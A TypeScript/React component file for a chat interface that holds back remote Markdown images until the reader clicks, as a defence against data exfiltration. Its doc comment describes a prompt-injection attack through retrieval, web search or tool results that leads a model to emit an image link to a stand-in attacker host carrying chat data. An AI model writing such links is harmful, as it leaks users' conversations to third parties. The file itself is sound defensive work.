import { Button } from "@romeo/ui";
import ImageIcon from "lucide-react/dist/esm/icons/image.mjs";
import { useState } from "react";

import { useLocale } from "./i18n";

/**
 * Where a Markdown image may be fetched from without the reader asking.
 *
 * Model output is untrusted: a prompt injected through RAG, web search or a
 * tool result can make the model write `![](https://attacker/?d=<chat data>)`,
 * and a live <img> would send that URL the moment the message renders. Only
 * images served by Romeo itself load automatically; every other origin waits
 * for an explicit click that shows the reader where the request will go.
 */
export type MarkdownImageSource =
  | { kind: "local"; src: string }
  | { host: string; kind: "remote"; src: string }
  | { kind: "invalid" };

export function classifyMarkdownImageSource(
  src: unknown,
  currentOrigin: string | undefined = globalThis.location?.origin,
): MarkdownImageSource {
  if (typeof src !== "string") return { kind: "invalid" };
  const value = src.trim();
  // Backslashes and control characters are normalised away by URL parsers,
  // so `/\host` would otherwise resolve to another origin.
  if (value.length === 0 || /[\\\u0000-\u001f\u007f]/u.test(value)) {
    return { kind: "invalid" };
  }
  if (value.startsWith("/") && !value.startsWith("//")) {
    return { kind: "local", src: value };
  }
  let url: URL;
  try {
    url = new URL(value);
  } catch {
    return { kind: "invalid" };
  }
  if (currentOrigin !== undefined && url.origin === currentOrigin) {
    return { kind: "local", src: url.href };
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") {
    return { kind: "invalid" };
  }
  return { host: url.host, kind: "remote", src: url.href };
}

export function MarkdownImage({
  alt,
  src,
}: {
  alt?: string | undefined;
  src?: unknown;
}) {
  const { t } = useLocale();
  const [loaded, setLoaded] = useState(false);
  const source = classifyMarkdownImageSource(src);
  const label = alt?.trim() ?? "";

  if (source.kind === "local" || (source.kind === "remote" && loaded)) {
    return (
      <img
        alt={label}
        className="rm-markdown-image"
        decoding="async"
        loading="lazy"
        referrerPolicy="no-referrer"
        src={source.src}
      />
    );
  }
  if (source.kind === "invalid") {
    return label.length > 0 ? <span>{label}</span> : null;
  }
  return (
    <span className="rm-markdown-image-blocked">
      <ImageIcon aria-hidden="true" size={16} />
      <span>{t("markdownRemoteImageBlocked")}</span>
      {label.length > 0 ? <span>{label}</span> : null}
      <span className="rm-markdown-image-host">{source.host}</span>
      <Button
        onClick={() => setLoaded(true)}
        size="sm"
        type="button"
        variant="outline"
      >
        {t("markdownRemoteImageLoad")}
      </Button>
    </span>
  );
}
